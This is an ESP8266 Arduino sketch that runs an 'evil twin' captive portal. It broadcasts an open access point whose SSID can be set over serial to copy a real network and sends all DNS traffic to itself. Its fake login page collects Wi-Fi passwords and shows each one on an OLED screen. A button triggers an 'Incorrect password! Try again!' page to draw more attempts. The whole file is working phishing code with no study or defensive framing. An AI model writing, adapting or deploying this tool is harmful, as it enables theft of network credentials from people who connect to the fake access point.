#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <Wire.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET    -1
#define BUTTON_PIN    D3
#define DNS_PORT      53

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

ESP8266WebServer server(80);
DNSServer dnsServer;

String currentSSID = "WiFi";
IPAddress APIP(172, 0, 0, 1);

void setup() {
  Serial.begin(115200);
  EEPROM.begin(512);
  delay(10);

  setupWiFi(currentSSID);

  dnsServer.start(DNS_PORT, "*", APIP);
  server.on("/", handleRoot);
  server.on("/submit", HTTP_POST, handleSubmit);
  server.onNotFound(handleNotFound);
  server.begin();

  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 allocation failed"));
    for (;;);
  }

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.print("password: ");
  display.display();

  pinMode(BUTTON_PIN, INPUT_PULLUP);
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  if (digitalRead(BUTTON_PIN) == LOW) {
    delay(50);
    if (digitalRead(BUTTON_PIN) == LOW) {
      display.clearDisplay();
      display.setCursor(0, 0);
      display.print("password: ");
      display.display();

      server.sendHeader("Location", "/", true);
      server.send(200, "text/html",
        "<html>"
        "<body>"
        "<p>Incorrect password! Try again!</p>"
        "<form action=\"/submit\" method=\"POST\">"
        "Password: <input type=\"password\" name=\"password\"><br>"
        "<input type=\"submit\" value=\"Submit\">"
        "</form>"
        "</body>"
        "</html>");
    }
  }

  if (Serial.available() > 0) {
    String newSSID = Serial.readStringUntil('\n');
    newSSID.trim();
    if (newSSID.length() > 0) {
      EEPROM.write(0, '\0');
      for (int i = 0; i < newSSID.length(); i++) {
        EEPROM.write(i, newSSID[i]);
      }
      EEPROM.write(newSSID.length(), '\0');
      EEPROM.commit();
      setupWiFi(newSSID);
    }
  }
}

void setupWiFi(String ssid) {
  currentSSID = ssid;
  WiFi.softAP(currentSSID.c_str());
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  Serial.print("Current SSID: ");
  Serial.println(currentSSID);
}

void handleRoot() {
  server.send(200, "text/html",
    "<html>"
    "<body>"
    "<form action=\"/submit\" method=\"POST\">"
    "Password: <input type=\"password\" name=\"password\"><br>"
    "<input type=\"submit\" value=\"Submit\">"
    "</form>"
    "</body>"
    "</html>");
}

void handleSubmit() {
  if (server.hasArg("password")) {
    String password = server.arg("password");
    display.setCursor(0, 10);
    display.clearDisplay();
    display.setCursor(0, 0);
    display.print("password: ");
    display.setCursor(0, 10);
    display.print(password);
    display.display();

    server.sendHeader("Location", "/", true);
    server.send(200, "text/html",
      "<html>"
      "<body>"
      "<form action=\"/submit\" method=\"POST\">"
      "Password: <input type=\"password\" name=\"password\"><br>"
      "<input type=\"submit\" value=\"Submit\">"
      "</form>"
      "</body>"
      "</html>");
  }
}

void handleNotFound() {
  server.send(404, "text/plain", "Not Found");
}
